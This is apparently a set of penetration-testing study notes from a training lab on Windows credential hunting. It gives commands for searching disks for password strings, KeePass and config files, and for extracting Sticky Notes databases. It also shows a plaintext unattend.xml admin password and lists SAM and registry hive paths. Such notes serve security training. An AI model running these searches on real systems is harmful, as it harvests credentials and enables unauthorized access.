# CREDENTIAL THEFT

### Hunting in Files


**Hunting for password files**

```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

**xampp configuration files**

```
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

**search files for users**

```
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

**Manually searching for files**

```
cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt

findstr /si password *.xml *.ini *.txt *.config

findstr /spin "password" *.*
```

**Search File Contents with PowerShell**

```
select-string -Path C:\Users\*.txt -Pattern password

dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

where /R C:\ *.config

Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

**Application Configuration Files**

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

**Dictionary Files**

```powershell
gc 'C:\Users\steve\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

## **Sticky Notes Passwords**

This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining

```powershell
PS C:\htb> ls

Directory: C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/25/2021  11:59 AM          20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session
-a----         5/25/2021  11:59 AM            982 Ecs.dat
-a----         5/25/2021  11:59 AM           4096 plum.sqlite
-a----         5/25/2021  11:59 AM          32768 plum.sqlite-shm
-a----         5/25/2021  12:00 PM         197792 plum.sqlite-wal
```

We can copy the three `plum.sqlite*` files down to our system and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the `Text` column in the `Note` table with the query `select Text from Note;`.

![https://academy.hackthebox.com/storage/modules/67/stickynote.png](https://academy.hackthebox.com/storage/modules/67/stickynote.png)

**Viewing Sticky Notes Data Using PowerShell**

```powershell
Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS C:\htb> cd .\PSSQLite\
PS C:\htb> Import-Module .\PSSQLite.psd1
PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
Text
----
\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter
\id=e4adae4c-a40b-48b4-93a5-900247852f96
\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
\id=c450fc5f-dc51-4412-b4ac-321fd41c522a Thycotic demo tomorrow at 10am
```

# **Unattended Installation Files**

Unattended installation files may define auto-logon settings or 
additional accounts to be created as part of the installation. Passwords
 in the `unattend.xml` are stored in plaintext or base64 encoded.

### Unattend.xml

Code: xml

```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend"><settings pass="specialize"><component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><AutoLogon><Password><Value>local_4dmin_p@ss</Value><PlainText>true</PlainText></Password><Enabled>true</Enabled><LogonCount>2</LogonCount><Username>Administrator</Username></AutoLogon><ComputerName>*</ComputerName></component></settings>
```

# Other files of interest

```
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

[**PowerShell credential enumeration**](CREDENTIAL%20THEFT%206fe9f1dfdff64ea59ebec0ac330bea17/PowerShell%20credential%20enumeration%208887b8413741421a8fd45668aeb77015.md)

[Further credential theft](CREDENTIAL%20THEFT%206fe9f1dfdff64ea59ebec0ac330bea17/Further%20credential%20theft%20b3d2bd76bca44910bd37629e83d1324c.md)